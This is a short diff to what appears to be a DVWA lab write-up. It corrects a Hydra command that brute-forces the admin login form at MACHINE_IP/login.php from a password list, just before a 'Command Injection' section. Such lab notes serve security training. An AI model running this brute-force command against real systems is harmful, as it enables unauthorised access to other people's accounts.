@@ -6,9 +6,12 @@ You'll need to set up the DVWA. To do this type any letter or word in the `usern
 
 <img alt="Hydra" src="https://img.shields.io/badge/-Hydra-1a73e8?style=flat-square&logo=Hydra&logoColor=white" />
 
+
+
+
 MACHINE_IP/login.php
 
-` hydra -l admin -P <path/to/file> MACHINE_IP http-post-form "/:username=^USER^&^password=PASS^:F='Login failed'" -V `
+` hydra -l admin -P <path/to/password/file> MACHINE_IP http-post-form "/login.php:username=^USER^&password=^PASS^:F='Login failed'" -V `
 
 
 ## Command Injection
